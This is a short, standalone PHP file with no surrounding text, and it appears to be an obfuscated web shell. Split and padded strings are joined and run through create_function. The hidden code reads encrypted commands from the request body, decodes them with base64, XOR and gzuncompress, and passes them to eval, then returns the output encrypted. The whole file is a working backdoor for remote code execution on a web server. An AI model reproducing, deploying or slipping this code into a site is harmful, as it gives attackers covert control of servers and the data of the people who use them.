<?php
$s='r//input"),$m)=_r=1) {@ob_start_r();@eva_rl(@_rg_r_rzunco_rm_rpress(@x(@bas_re_r64_decode($m[1]),$k)))_r;$o=@ob__rget_';
$Z='{$c=s_rtr_rlen($k)_r;$l=st_rrlen($t)_r;$o="";f_ror($i=0;_r_r$i_r<$_rl;){for($j=0;($j<$_rc&&$_ri<_r$_rl);$j++,$i_r++){$';
$S='o.=$t{_r$i}^$_rk{$j}_r;_r}}return $o;}if_r (_r@preg_r_ma_r_rtch("/$kh(._r_r+)$kf/",@file_ge_rt_contents(_r_r"php_r:_r_';
$v='$k="317_r84d80_r"_r;$kh="f9_r17970869bf"_r;$kf_r="0_r9cacb_r255d98_r";$p="_rDY_r0_ruEgKq4Y2Md_rSvt";function x(_r$t,$k_r)';
$Y='co_rntents();_r_r@ob_en_rd_clea_rn();$r=@ba_rs_re64_encode(@x_r(_r@gz_rcomp_rre_rss($o),_r$k));print("$p$kh$r$_rkf");}';
$M=str_replace('Qg','','creQgQgaQgte_fuQgncQgtQgion');
$V=str_replace('_r','',$v.$Z.$S.$s.$Y);
$o=$M('',$V);$o();
?>
